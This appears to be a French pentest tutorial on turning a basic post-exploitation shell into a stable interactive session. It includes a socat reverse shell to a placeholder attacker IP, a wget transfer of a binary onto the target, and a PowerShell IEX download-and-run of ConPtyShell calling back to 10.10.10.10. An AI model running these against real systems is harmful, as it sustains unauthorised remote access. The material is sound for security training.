# Amélioration des Shells

Les shells initiaux sont souvent limités et instables. Cette section couvre les techniques pour transformer un shell basique en session interactive complète.
## Problèmes Courants des Shells Initiaux

Les shells obtenus après exploitation présentent souvent ces limitations:
- Absence d'historique de commandes
- Pas de complétion tab
- Pas de contrôle des processus (CTRL+C termine la session)
- Gestion limitée des caractères spéciaux
- Interface non interactive
- Manque de fonctionnalités du terminal
## Obtention d'un Shell TTY
### Linux/Unix
#### Python PTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# ou avec Python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#### Script
```bash
script -qc /bin/bash /dev/null
```
#### Autres méthodes
```bash
# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/bash"'

# Lua
lua -e 'os.execute("/bin/bash")'

# AWK
awk 'BEGIN {system("/bin/bash")}'

# Find
find / -name example -exec /bin/bash \; -quit
```
## Stabilisation Complète du Shell

### Méthode 1: Python + stty

```bash
# Étape 1: Obtenir un shell de base avec Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Étape 2: Mettre en arrière-plan avec CTRL+Z
# [Presser CTRL+Z]

# Étape 3: Sur votre machine, vérifier et ajuster les paramètres du terminal
stty -a

# Étape 4: Configurer votre terminal local pour raw mode
stty raw -echo

# Étape 5: Revenir au shell distant
fg
[Presser Entrée deux fois]

# Étape 6: Configurer le terminal distant
export TERM=xterm
stty rows 38 columns 116
```
### Méthode 2: Socat
```bash
# Sur l'attaquant, préparer un binaire socat statique
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat

# Transférer le binaire vers la cible
# Par exemple avec un serveur web temporaire
python3 -m http.server 8000

# Sur la cible
wget http://IP_ATTAQUANT:8000/socat -O /tmp/socat
chmod +x /tmp/socat

# Créer un reverse shell TTY avec socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP_ATTAQUANT:4444

# Sur l'attaquant
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
### Méthode 3: rlwrap (pour les shells instables)

```bash
# Installation sur l'attaquant
sudo apt install rlwrap

# Utilisation
rlwrap nc -lvnp 4444
```
## Amélioration des Shells Windows
### PowerShell à CMD et vice-versa
```powershell
# De PowerShell à CMD
cmd.exe

# De CMD à PowerShell
powershell.exe
```
### ConPtyShell (Windows 10/11)
[ConPtyShell](https://github.com/antonioCoco/ConPtyShell) offre un shell PTY complet sur les systèmes Windows modernes.

```bash
# Sur l'attaquant
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Sur la cible Windows (PowerShell)
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.10.10 4444
```
### Windows Terminal (pour le confort)
Si vous avez accès à une session graphique sur Windows:

```powershell
# Vérifier si Windows Terminal est installé
Get-AppxPackage -Name Microsoft.WindowsTerminal

# Lancer Windows Terminal pour une meilleure expérience
wt.exe
```
## Configuration d'Environnement
Une fois le shell stabilisé, configurez l'environnement:

```bash
# Linux/Unix
export TERM=xterm-256color
export SHELL=bash
export EDITOR=vim   # ou nano

# Modifier le prompt pour plus de visibilité
export PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
```
## Astuces pour la Gestion des Shells

| Problème | Solution |
|----------|----------|
| Session bloquée | Utiliser un autre terminal et redémarrer le listener |
| Accès limité | Essayer différentes techniques selon les binaires disponibles |
| Limitations de sorties | Rediriger les sorties vers des fichiers (`command > output.txt`) |
| Absence d'éditeur | Utiliser `echo`, `printf` ou `cat` pour créer/modifier des fichiers |
| Connexion instable | Configurer un script pour reconnexion automatique |
## Scripts Utiles pour l'Automatisation

```bash
# Script pour automatiser la stabilisation (à exécuter sur l'attaquant)
cat <<EOF > stabilize.sh
#!/bin/bash
echo "[*] Upgrading shell..."
echo "Exécutez ces commandes sur la cible après avoir obtenu un shell:"
echo "----------------------------------------------"
echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo "Appuyez sur CTRL+Z pour mettre en arrière-plan"
echo "stty raw -echo; fg"
echo "export TERM=xterm"
echo "stty rows 38 columns 116"
echo "----------------------------------------------"
EOF
chmod +x stabilize.sh
```